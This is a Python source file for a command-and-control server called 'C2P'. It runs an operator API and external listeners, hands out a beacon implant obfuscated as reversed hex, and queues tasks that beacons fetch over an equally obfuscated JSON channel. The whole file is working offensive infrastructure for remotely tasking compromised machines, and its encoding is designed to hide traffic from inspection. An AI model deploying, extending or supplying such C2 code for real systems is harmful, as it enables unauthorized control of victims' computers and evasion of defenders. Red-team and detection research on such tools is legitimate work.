#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
from aiohttp import ClientSession, web, CookieJar, client_exceptions
import uuid
import json
import time
from pathlib import Path

from src.core.logger_config import configure_logger, logger

class Beacon(object):
    """Beacon object"""
    def __init__(self, language="python"):
        self.language = language
        self.uuid = uuid.uuid4()
        self.last_seen = time.time()
        self.tasksinfos = {}
        self.tasks = {}
    
    def consumeTasks(self):
        self.last_seen = time.time()
        tasks = {}
        for taskid, task in self.tasks.items():
            if self.tasksinfos[taskid]['state'] == 'pending':
                self.tasksinfos[taskid]['state'] = 'delivered'
                if 'name' in self.tasksinfos[taskid].keys():
                    name = self.tasksinfos[taskid]['name']
                    msg = f"📤​​ {self.uuid.hex} delivered task '{name}' {taskid} "
                else:
                    msg = f"📤​​ {self.uuid.hex} delivered task {taskid} "
                logger.info(msg)
                tasks[taskid]=task
        return tasks

    def newTask(self, task):
        taskid = uuid.uuid4().hex
        if 'task' not in task or type(task.task) != dict:
            return None
        else:
            self.tasks[taskid] = task.task

        if 'info' in task.keys() and type(task.info) == dict:
            self.tasksinfos[taskid] = task.info
        else:
            self.tasksinfos[taskid] = {}

        self.tasksinfos[taskid]['state'] = 'pending'
        self.tasksinfos[taskid]['created'] = time.time()

        if 'name' in self.tasksinfos[taskid].keys():
            name = self.tasksinfos[taskid]['name']
            msg = f"📦​​ {self.uuid.hex} new task '{name}' {taskid}"
        else:
            msg = f"📦​​ {self.uuid.hex} new task {taskid}"
        logger.info(msg)
        return taskid

class C2P(object):
    """C2P class that hold servers and beacons"""
    running = True
    apirunner = None
    extrunner = None
    listeners = {}
    beacons = {}
    client_max_size = 1024**2*99999
    default_ext_host = "0.0.0.0"
    default_ext_port = 8888
    
    async def start(self):
        """Start C2P server class"""
        await self.ApiServer()
        await self.ExtServer()
        await self.AddListener(self.default_ext_host, self.default_ext_port)

    async def cleanup(self):
        """Clean before exit"""
        await self.apirunner.cleanup()
        await self.extrunner.cleanup()

    async def GetBeacon(self, beaconuuid):
        beaconuuid = uuid.UUID(beaconuuid)
        if beaconuuid.hex not in self.beacons.keys():
            beacon = Beacon()
            beacon.uuid = beaconuuid
            self.beacons[beacon.uuid.hex] = beacon
            msg = f"♻️​  Old beacon : {beacon.uuid.hex}"
            logger.info(msg)
        else:
            beacon = self.beacons[beaconuuid.hex]
        return beacon

    def encode(self, data):
        return json.dumps(data).encode().hex()[::-1]
    
    def decode(self, data):
        if type(data) == bytes:
            data = data.decode()
        return json.loads(bytes.fromhex(data[::-1]))
    
    async def WUpdateBeacon(self, req):
        beaconuuid = req.match_info.get('beaconuuid')
        beacon = await self.GetBeacon(beaconuuid)

        data = await req.text()
        data = self.decode(data)

        update = {"tasks": beacon.consumeTasks()}
        return web.Response(body=self.encode(update))

    async def ExtServer(self):
        """Define external listener routes"""
        app = web.Application(client_max_size=self.client_max_size)
        app.add_routes([
        web.get('/', self.WInitPyBeacon),
        web.post('/{beaconuuid}', self.WUpdateBeacon),
        ])

        runner = web.AppRunner(app)
        await runner.setup()

        self.extrunner = runner

    async def ApiServer(self):
        """Start API server"""
        app = web.Application(client_max_size=self.client_max_size)
        app.add_routes([
        web.get('/listeners', self.WGetListeners),
        web.post('/stop', self.WStop),
        web.post('/listener/del', self.WDeleteListener),
        web.post('/listener/add', self.WAddListener),
        ])

        runner = web.AppRunner(app)
        await runner.setup()

        ssl_context = None
        host = "127.0.0.15"
        port = 7641
        site = web.TCPSite(runner, host, port, ssl_context=ssl_context)
        await site.start()
        msg = f"✨​ API server {host}:{port}"
        logger.info(msg)

        self.listeners[f"{host}:{port}"] = site
        self.apirunner = runner

    async def WStop(self, req):
        """WEB - Stop C2P"""
        self.running = False
        msg = "🔴 Stop request sent"
        logger.info(msg)
        return web.json_response({"msg": msg})

    async def WDeleteListener(self, req):
        """WEB - Remove listener"""
        data = await req.post()
        host = data.get('host', self.default_ext_host)
        port = data.get('port', self.default_ext_port)
        key = f"{host}:{port}"
        if key not in self.listeners.keys():
            msg = "❓ No active listener found"
            return web.json_response({"msg": msg})
        
        await self.listeners[key].stop()
        del self.listeners[key]

        msg = f"​❌​ Removed listener {host}:{port}"
        logger.info(msg)
        return web.json_response({"msg": msg})

    async def AddListener(self, host, port, ssl_context=None):
        """Add new external listener"""
        site = web.TCPSite(self.extrunner, host, port, ssl_context=ssl_context)
        await site.start()
        self.listeners[f"{host}:{port}"] = site
        msg = f"​🚀​ New listener {host}:{port}"
        logger.info(msg)
        return site

    async def WAddListener(self, req):
        """WEB - Add new external listener"""
        data = await req.post()
        host = data.get('host', self.default_ext_host)
        port = data.get('port', self.default_ext_port)
        key = f"{host}:{port}"
        if key in self.listeners.keys():
            msg = "❓​​ Already listening"
            return web.json_response({"msg": msg})

        await self.AddListener(host, port)
        msg = f"​🚀​ New listener {host}:{port}"
        return web.json_response({"msg": msg})
    
    async def WGetListeners(self, req):
        """WEB - List external listeners"""
        listeners = [x for x in self.listeners.keys()]
        return web.json_response(listeners)

    async def WInitPyBeacon(self, req):
        """WEB - Serve python beacon"""
        beacon = Beacon()
        self.beacons[beacon.uuid.hex] = beacon
        msg = f"🌱​ New beacon : {beacon.uuid.hex}"
        logger.info(msg)

        agent_file_path = Path(__file__).parent.parent / "beacons" / "beacon.py"
        with open(agent_file_path, 'rb') as f:
            content = f.read()
        content = content.replace(b'REPLACEUUID', f"{beacon.uuid.hex}".encode())
        content = content.hex()[::-1]
        return web.Response(text=content)

async def StartServer():
    """Start server"""
    configure_logger()
    c2p = C2P()
    await c2p.start()
    while c2p.running:
        try: await asyncio.sleep(0.5)
        except: 
            print("")
            logger.info("🌶️​  Exception received")
            break
    
    logger.info("​🧹​​ Ending C2P")
    await c2p.cleanup()
    logger.info("👋​ Graceful exit")

def main():
    """Start async"""
    asyncio.run(StartServer())